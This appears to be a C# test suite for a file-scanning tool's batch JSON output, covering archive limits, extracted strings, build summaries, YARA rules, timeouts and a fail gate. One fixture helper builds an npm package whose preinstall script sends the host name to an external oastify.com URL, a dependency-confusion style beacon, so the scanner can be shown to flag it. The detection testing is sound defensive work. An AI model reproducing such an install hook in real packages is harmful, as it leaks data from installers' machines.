using System.IO.Compression;
using System.Text.Json;
using System.Text.Json.Nodes;
using Corvus.Native.Providers.Worker;
using Corvus.Native.Providers.Worker.Yara;
using Corvus.Setup;
using ModelContextProtocol.Protocol;

namespace Corvus.Tests;

/// <summary>batch --file --json: the fixed read-only steps over one file, written as one corvus.batch/1 document.</summary>
public class FileBatchTests
{
    private static async Task<(int Code, JsonNode? Document, string Out)> Batch(params string[] args)
    {
        var (code, output, _) = await ToolCliTests.Run(["batch", .. args, "--json", "--no-index"]);
        return (code, output.Length > 0 ? JsonNode.Parse(output) : null, output);
    }

    private static JsonNode Section(JsonNode document, string name) => document["sections"]!.AsArray().Single(s => (string?)s!["name"] == name)!;

    [Fact]
    public async Task A_container_over_its_file_limit_is_partial_and_keeps_the_files_read()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "five.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
            for (int i = 0; i < 5; i++)
                using (var writer = new StreamWriter(archive.CreateEntry($"d/f{i}.txt").Open())) writer.Write("text");
        var (code, document, _) = await Batch("--file", zip, "--limit", "containerFiles=3");
        Assert.Equal(0, code);
        Assert.Equal("corvus.batch/1", (string?)document!["schema"]);
        Assert.False((bool)document["complete"]!);
        Assert.Equal(3, (int)document["limits"]!["containerFiles"]!);
        Assert.Equal("zip", (string?)document["file"]!["type"]);
        Assert.Equal("complete", (string?)Section(document, "summary")["status"]);
        var container = Section(document, "container");
        Assert.Equal("partial", (string?)container["status"]);
        Assert.Equal("containerFiles", (string?)container["limit"]);
        Assert.Equal(3, container["result"]!["items"]!.AsArray().Count);
        Assert.Equal(5, (int)container["result"]!["total"]!);
        Assert.Equal("not_applicable", (string?)Section(document, "strings")["status"]);
        Assert.Equal("not_applicable", (string?)Section(document, "yara")["status"]);
    }

    [Fact]
    public async Task A_container_longer_than_one_response_page_is_listed_to_its_end_below_the_limit()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "many.zip");
        // Long member names keep one default response page well under the 300 members.
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
            for (int i = 0; i < 300; i++)
                using (var writer = new StreamWriter(archive.CreateEntry($"dir/sub/file_{i:D4}_with_a_longer_name_for_width.txt").Open())) writer.Write("text");
        var (code, document, _) = await Batch("--file", zip);
        Assert.Equal(0, code);
        var container = Section(document!, "container");
        Assert.Equal("complete", (string?)container["status"]);
        Assert.Null(container["limit"]);
        Assert.Equal(300, container["result"]!["items"]!.AsArray().Count);
        Assert.False((bool)container["result"]!["hasMore"]!);
    }

    [Fact]
    public void A_result_whose_coverage_is_partial_gives_a_partial_section_with_its_reason()
    {
        var result = new CallToolResult
        {
            Content = [new TextContentBlock { Text = "rows" }],
            StructuredContent = JsonSerializer.SerializeToElement(new
            {
                items = new[] { new { path = "a.txt" } },
                hasMore = false,
                coverage = new { status = "partial", reason = "members over the size cap were not read", limitations = new[] { "size-cap" } },
            }),
        };
        var section = ToolCli.Section(new ToolCli.FileBatchStep("container", "search_container", "containerFiles"), result);
        Assert.Equal("partial", (string?)section["status"]);
        Assert.Equal("members over the size cap were not read", (string?)section["reason"]);
        Assert.Null(section["limit"]);
        Assert.Single(section["result"]!["items"]!.AsArray());
    }

    [Fact]
    public async Task A_dotnet_assembly_gets_its_typed_strings_and_no_container_listing()
    {
        using var dir = new TempDir();
        var dll = Path.Combine(dir.Path, "Lib.dll");
        File.WriteAllBytes(dll, Roslyn.Release("Lib", """public static class C { public static string U() => "https://example.com/api/items"; }"""));
        var (code, document, _) = await Batch("--file", dll);
        Assert.Equal(0, code);
        Assert.Equal("not_applicable", (string?)Section(document!, "container")["status"]);
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == "https://example.com/api/items");
    }

    [Fact]
    public async Task A_zip_holding_an_assembly_gets_its_typed_strings_with_the_member_path()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "app.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
        using (var stream = archive.CreateEntry("lib/Lib.dll").Open())
            stream.Write(Roslyn.Release("Lib", """public static class C { public static string U() => "https://example.com/api/items"; }"""));
        var (code, document, _) = await Batch("--file", zip);
        Assert.Equal(0, code);
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        var url = Assert.Single(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == "https://example.com/api/items")!;
        Assert.StartsWith("lib/Lib.dll: ", (string?)url["locations"]![0]);
    }

    [Fact]
    public async Task A_ZIP_that_is_not_a_build_has_a_build_section_that_does_not_apply()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "notes.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
        using (var writer = new StreamWriter(archive.CreateEntry("notes.txt").Open())) writer.Write("text");
        var (code, document, _) = await Batch("--file", zip);
        Assert.Equal(0, code);
        var buildSection = Section(document!, "build");
        Assert.Equal("not_applicable", (string?)buildSection["status"]);
        Assert.Contains("not_a_build", (string?)buildSection["reason"]);
        Assert.True((bool)document!["complete"]!);
    }

    [Fact]
    public async Task A_single_file_that_is_not_a_package_is_not_read_as_a_build()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "plain.bin");
        File.WriteAllBytes(file, new byte[64]);
        var (_, document, _) = await Batch("--file", file);
        Assert.Equal("not_applicable", (string?)Section(document!, "build")["status"]);
    }

    [Fact]
    public async Task An_android_package_with_metadata_gets_the_build_summary()
    {
        using var dir = new TempDir();
        var apk = Path.Combine(dir.Path, "app.apk");
        using (var archive = ZipFile.Open(apk, ZipArchiveMode.Create))
            foreach (var (name, bytes) in new (string, byte[])[]
                     {
                         ("lib/arm64-v8a/libil2cpp.so", [0x7F, 0x45, 0x4C, 0x46, 2]),
                         ("lib/arm64-v8a/libunity.so", [0x7F, 0x45, 0x4C, 0x46, 2]),
                         ("assets/bin/Data/Managed/Metadata/global-metadata.dat", BuildSummaryTests.Metadata(27, ["Player"])),
                         ("assets/bin/Data/data.unity3d", [.. "UnityFS\0"u8, 0, 0, 0, 8, .. "5.x.x\0"u8, .. "2021.1.5f1\0"u8, 0, 0, 0, 0]),
                     })
                using (var stream = archive.CreateEntry(name).Open()) stream.Write(bytes);
        var (code, document, _) = await Batch("--file", apk);
        Assert.Equal(0, code);
        var buildSection = Section(document!, "build");
        Assert.Equal("complete", (string?)buildSection["status"]);
        Assert.Equal("aot", (string?)buildSection["result"]!["backend"]!["kind"]);
        Assert.Equal("readable", (string?)buildSection["result"]!["backend"]!["metadataState"]);
        Assert.Equal("2021.1.5f1", (string?)buildSection["result"]!["engine"]!["version"]);
    }

    [Fact]
    public async Task A_run_the_time_limit_ends_still_writes_its_document_and_exits_124()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "plain.bin");
        File.WriteAllBytes(file, new byte[64]);
        var (code, document, _) = await Batch("--file", file, "--time-limit", "0.001");
        Assert.Equal(124, code);
        Assert.False((bool)document!["complete"]!);
        Assert.Equal("timeout", (string?)Section(document, "summary")["status"]);
        Assert.Equal("not_applicable", (string?)Section(document, "yara")["status"]);
    }

    [YaraFact]
    public async Task Given_rules_the_yara_section_lists_the_rules_that_matched()
    {
        using var dir = new TempDir();
        var file = dir.File("notes.txt");
        File.WriteAllText(file, "a fixture note for the batch scan");
        var rules = dir.File("batch.yar");
        File.WriteAllText(rules, """
            rule names_the_fixture { strings: $a = "fixture note" condition: $a }
            rule absent_text { strings: $n = "not in the fixture" condition: $n }
            """);
        using var pool = new WorkerPool(new WorkerPoolOptions
        {
            Enabled = true,
            MemoryLimitBytes = 0,
            Start = WorkerPool.OwnCommand() with { Environment = new Dictionary<string, string?> { [YaraX.LibraryVariable] = YaraTestTools.Library } },
        });
        using var shared = WorkerPool.UseShared(pool);
        var (code, document, _) = await Batch("--file", file, "--rules", rules);
        Assert.Equal(0, code);
        var yara = Section(document!, "yara");
        Assert.Equal("complete", (string?)yara["status"]);
        Assert.Equal("names_the_fixture", Assert.Single(yara["result"]!["items"]!.AsArray())!["name"]!.GetValue<string>());
    }

    [Fact]
    public async Task With_the_worker_host_off_the_yara_section_is_unavailable_and_names_the_variable()
    {
        using var dir = new TempDir();
        var file = dir.File("notes.txt");
        File.WriteAllText(file, "text");
        var rules = dir.File("batch.yar");
        File.WriteAllText(rules, "rule any_text { condition: true }");
        using var pool = new WorkerPool(new WorkerPoolOptions { Enabled = false });
        using var shared = WorkerPool.UseShared(pool);
        var (code, document, _) = await Batch("--file", file, "--rules", rules);
        Assert.Equal(0, code);
        var yara = Section(document!, "yara");
        Assert.Equal("unavailable", (string?)yara["status"]);
        Assert.Contains(WorkerPool.EnableVariable, (string?)yara["reason"]);
    }

    [Fact]
    public async Task A_missing_file_or_bad_limit_is_a_usage_error_with_nothing_on_stdout()
    {
        using var dir = new TempDir();
        var (code, _, output) = await Batch("--file", Path.Combine(dir.Path, "absent.bin"));
        Assert.Equal(2, code);
        Assert.Empty(output);
        (code, _, output) = await Batch("--file", dir.Path, "--limit", "noSuchLimit=3");
        Assert.Equal(2, code);
        Assert.Empty(output);
        (code, _, output) = await Batch("--file", dir.Path, "--rules", Path.Combine(dir.Path, "absent.yar"));
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    [Fact]
    public async Task A_serialized_asset_file_gets_its_field_strings_in_the_strings_section()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "sharedassets0.assets");
        File.WriteAllBytes(file, AssetFileStringsTests.ConfigFile());
        var (code, document, _) = await Batch("--file", file);
        Assert.Equal(0, code);
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        var items = strings["result"]!["items"]!.AsArray();
        var url = Assert.Single(items, i => (string?)i!["value"] == AssetFileStringsTests.Url)!;
        Assert.Equal("sharedassets0.assets: Endpoints (Script: Net.Config).url", (string?)url["locations"]![0]);
        Assert.Contains(items, i => (string?)i!["type"] == "encoded" && (string?)i["detail"] == "base64, 32 bytes");
        Assert.Equal(1 << 30, (double)document!["limits"]!["assetBytes"]!);
    }

    [Fact]
    public async Task A_build_folder_gets_its_asset_strings_and_a_folder_without_one_does_not_apply()
    {
        using var dir = new TempDir();
        var data = Directory.CreateDirectory(Path.Combine(dir.Path, "App", "App_Data")).FullName;
        File.WriteAllBytes(Path.Combine(data, "level0"), AssetFileStringsTests.ConfigFile());
        var (_, document, _) = await Batch("--file", Path.Combine(dir.Path, "App"));
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == AssetFileStringsTests.Url);
        var plain = Directory.CreateDirectory(Path.Combine(dir.Path, "plain")).FullName;
        File.WriteAllText(Path.Combine(plain, "notes.txt"), "text");
        (_, document, _) = await Batch("--file", plain);
        strings = Section(document!, "strings");
        Assert.Equal("not_applicable", (string?)strings["status"]);
        Assert.Contains("not_a_build", (string?)strings["reason"]);
    }

    [Fact]
    public async Task An_asset_layout_that_did_not_read_makes_the_strings_section_partial_with_its_reason()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "level0");
        File.WriteAllBytes(file, AssetFileStringsTests.ConfigFile(typeTrees: false));
        var (_, document, _) = await Batch("--file", file);
        var strings = Section(document!, "strings");
        Assert.Equal("partial", (string?)strings["status"]);
        Assert.Contains("partial or unknown", (string?)strings["reason"]);
        Assert.False((bool)document!["complete"]!);
    }

    [Fact]
    public async Task An_asset_byte_limit_makes_the_strings_section_partial_and_keeps_the_rows_read()
    {
        using var dir = new TempDir();
        var data = Directory.CreateDirectory(Path.Combine(dir.Path, "App", "App_Data")).FullName;
        var first = AssetFileStringsTests.ConfigFile();
        File.WriteAllBytes(Path.Combine(data, "level0"), first);
        File.WriteAllBytes(Path.Combine(data, "level1"), AssetFileStringsTests.ConfigFile());
        var (_, document, _) = await Batch("--file", Path.Combine(dir.Path, "App"), "--limit", $"assetBytes={first.Length}");
        var strings = Section(document!, "strings");
        Assert.Equal("partial", (string?)strings["status"]);
        Assert.Contains("level1 and 0 later files are not", (string?)strings["reason"]);
        Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == AssetFileStringsTests.Url);
    }

    /// <summary>Writes an npm package whose install script sends the host name to a collection URL.</summary>
    internal static string Package(string path)
    {
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        using (var gz = new GZipStream(File.Create(path), CompressionLevel.Fastest))
        using (var tar = new System.Formats.Tar.TarWriter(gz, System.Formats.Tar.TarEntryFormat.Ustar))
            foreach (var (name, text) in new[]
                     {
                         ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
                         ("package/index.js", "const os=require('os'),https=require('https');\nhttps.get('https://x1.oastify.com/?h='+os.hostname());"),
                     })
                tar.WriteEntry(new System.Formats.Tar.UstarTarEntry(System.Formats.Tar.TarEntryType.RegularFile, name) { DataStream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(text)) });
        return path;
    }

    [Fact]
    public async Task The_summary_names_the_file_level_and_the_findings_that_set_it()
    {
        using var dir = new TempDir();
        var package = Package(Path.Combine(dir.Path, "internal-auth-1.0.0.tgz"));
        var (_, document, _) = await Batch("--file", package);
        var summary = document!["summary"]!;
        Assert.Equal("noteworthy", (string?)summary["level"]);
        var reasons = summary["reasons"]!.AsArray();
        Assert.Contains(reasons, r => (string?)r!["rule"] == "package/collection-url" && (string?)r["source"] == "package");
        Assert.All(reasons, r => Assert.Equal("noteworthy", (string?)r!["level"]));

        var plain = Path.Combine(dir.Path, "notes.txt");
        File.WriteAllText(plain, "plain text");
        var (_, other, _) = await Batch("--file", plain);
        Assert.Equal("none", (string?)other!["summary"]!["level"]);
        Assert.Empty(other["summary"]!["reasons"]!.AsArray());
    }

    [Fact]
    public async Task The_document_names_the_rule_table_digest_and_each_installed_rule_pack_with_its_version_and_digest()
    {
        using var dir = new TempDir();
        var plain = Path.Combine(dir.Path, "notes.txt");
        File.WriteAllText(plain, "plain text");
        var (_, document, _) = await Batch("--file", plain);
        Assert.Equal(Corvus.Services.Analysis.FindingRules.Digest, (string?)document!["ruleTable"]);
        var installed = Corvus.Core.RulePacks.Installed(Corvus.Core.RulePacks.Root).Select(p => $"{p.Name} {p.Version} {p.Digest ?? "unknown"}");
        Assert.Equal(installed, document["rulePacks"]!.AsArray().Select(p => $"{(string?)p!["name"]} {(string?)p["version"]} {(string?)p["digest"]}"));
    }

    [Fact]
    public async Task A_folder_gives_one_record_per_sha256_with_every_path_and_the_noteworthy_record_first()
    {
        using var dir = new TempDir();
        File.WriteAllText(Path.Combine(dir.Path, "a.txt"), "plain text");
        var package = Package(Path.Combine(dir.Path, "sub", "pkg.tgz"));
        Directory.CreateDirectory(Path.Combine(dir.Path, "sub", "deep"));
        File.Copy(package, Path.Combine(dir.Path, "sub", "deep", "pkg-copy.tgz"));
        var (code, document, _) = await Batch("--file", dir.Path, "--recurse");
        Assert.Equal(0, code);
        Assert.Equal("noteworthy", (string?)document!["summary"]!["level"]);
        Assert.Equal(3, (int)document["summary"]!["files"]!);
        var records = document["records"]!.AsArray();
        Assert.Equal(2, records.Count);
        var first = records[0]!;
        Assert.Equal(["sub/deep/pkg-copy.tgz", "sub/pkg.tgz"], first["file"]!["paths"]!.AsArray().Select(p => (string?)p));
        Assert.Equal("noteworthy", (string?)first["summary"]!["level"]);
        Assert.True((int)first["counts"]!["noteworthy"]! > 0);
        var sha = (string)first["file"]!["sha256"]!;
        Assert.Equal(Convert.ToHexStringLower(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(package))), sha);
        Assert.All(first["findings"]!.AsArray(), f => Assert.StartsWith(sha + "|" + (string?)f!["rule"] + "|", (string?)f["key"]));
        Assert.Equal("a.txt", (string?)records[1]!["file"]!["paths"]![0]);
        Assert.Equal("none", (string?)records[1]!["summary"]!["level"]);
        Assert.Null(document["sections"]);
    }

    [Fact]
    public async Task Files_past_the_members_limit_are_named_and_leave_the_run_incomplete()
    {
        using var dir = new TempDir();
        for (int i = 0; i < 3; i++) File.WriteAllText(Path.Combine(dir.Path, $"f{i}.txt"), $"text {i}");
        var (code, document, _) = await Batch("--file", dir.Path, "--recurse", "--limit", "members=2");
        Assert.Equal(0, code);
        Assert.Equal(2, document!["records"]!.AsArray().Count);
        Assert.False((bool)document["complete"]!);
        Assert.StartsWith("Files past the members limit of 2: 1, from ", (string?)document["unread"]![0]);
    }

    [Fact]
    public async Task A_noteworthy_package_fails_the_gate_with_exit_1_and_a_plain_file_passes()
    {
        using var dir = new TempDir();
        var package = Package(Path.Combine(dir.Path, "pkg.tgz"));
        var (code, document, _) = await Batch("--file", package, "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        var gate = document!["gate"]!;
        Assert.True((bool)gate["failed"]!);
        Assert.Contains(gate["reasons"]!.AsArray(), r => ((string)r!).Contains("noteworthy finding package/collection-url, key ", StringComparison.Ordinal));
        var plain = dir.File("notes.txt");
        File.WriteAllText(plain, "plain text");
        (code, document, _) = await Batch("--file", plain, "--fail-on", "review");
        Assert.Equal(0, code);
        Assert.False((bool)document!["gate"]!["failed"]!);
    }

    [Fact]
    public async Task A_run_the_time_limit_ends_fails_the_gate_unless_incomplete_records_are_allowed()
    {
        using var dir = new TempDir();
        File.WriteAllBytes(dir.File("plain.bin"), new byte[64]);
        var (code, document, _) = await Batch("--file", dir.Path, "--recurse", "--time-limit", "0.001", "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        Assert.Contains("plain.bin: summary timeout", document!["gate"]!["reasons"]!.AsArray().Select(r => (string?)r));
        (code, document, _) = await Batch("--file", dir.Path, "--recurse", "--time-limit", "0.001", "--fail-on", "noteworthy", "--allow-incomplete");
        Assert.Equal(0, code);
        Assert.Empty(document!["gate"]!["reasons"]!.AsArray());
    }

    [Fact]
    public void Two_findings_of_one_rule_in_one_file_each_fail_the_gate()
    {
        var finding = (string evidence) => new JsonObject
        {
            ["level"] = "review", ["rule"] = "script/download", ["evidence"] = evidence, ["location"] = null,
            ["key"] = ToolCli.FindingKey("ab", "script/download", "review", evidence, null),
        };
        var document = new JsonObject
        {
            ["file"] = new JsonObject { ["path"] = "run.ps1" },
            ["findings"] = new JsonArray(finding("https://example.com/a"), finding("https://example.com/b")),
            ["sections"] = new JsonArray(),
        };
        var failures = ToolCli.GateFailures(document, "review", allowIncomplete: false);
        Assert.Equal(2, failures.Count);
        Assert.NotEqual(failures[0], failures[1]);
        Assert.Empty(ToolCli.GateFailures(document, "noteworthy", allowIncomplete: false));
    }

    [Fact]
    public async Task A_bad_fail_on_level_is_a_usage_error()
    {
        using var dir = new TempDir();
        var (code, _, output) = await Batch("--file", dir.Path, "--fail-on", "info");
        Assert.Equal(2, code);
        Assert.Empty(output);
        (code, _, output) = await Batch("--file", dir.Path, "--allow-incomplete");
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    [Fact]
    public void A_summary_step_without_a_result_leaves_the_level_unknown()
    {
        Assert.Equal("unknown", (string?)ToolCli.Verdict(null)["level"]);
    }
}
